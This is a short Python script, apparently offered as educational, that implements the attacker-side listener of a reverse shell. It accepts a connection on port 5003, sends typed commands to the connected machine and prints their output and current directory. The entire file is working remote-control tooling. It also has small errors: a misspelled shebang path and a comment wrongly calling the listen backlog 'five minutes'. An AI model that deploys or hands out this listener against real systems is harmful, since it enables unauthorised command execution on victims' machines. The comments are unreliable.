#!/ur/bin/env python

'''
# Author: Gokan Bektas
# Date: 3-10-2022
# Version: 1.2
                         ########################## Educational Purpose !!! ##########################
                         
# Description: This is a reverse shell application, script will listen server host. 
'''


import socket
from termcolor import colored

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128
SEPARATOR = '<sep>'

sock = socket.socket()

sock.bind((SERVER_HOST, SERVER_PORT))

sock.listen(5) # 5 refers five minutes
print(f'Listening as {SERVER_HOST} : {SERVER_PORT}...')

client_socket, client_address = sock.accept()
print(f'{client_address[0]}:{client_address[1]} Connected! ')

cwd = client_socket.recv(BUFFER_SIZE).decode()
print(f'[+] Current working directory: {cwd}')

while True:
    command = input(colored(f'{cwd} $ ', 'red'))
    if not command.strip():
        continue
    client_socket.send(command.encode())
    if command.lower() == 'exit':
        break
    output = client_socket.recv(BUFFER_SIZE).decode()
    #spolit command output and current directory
    results, cwd = output.split(SEPARATOR)
    #print output
    print(results)
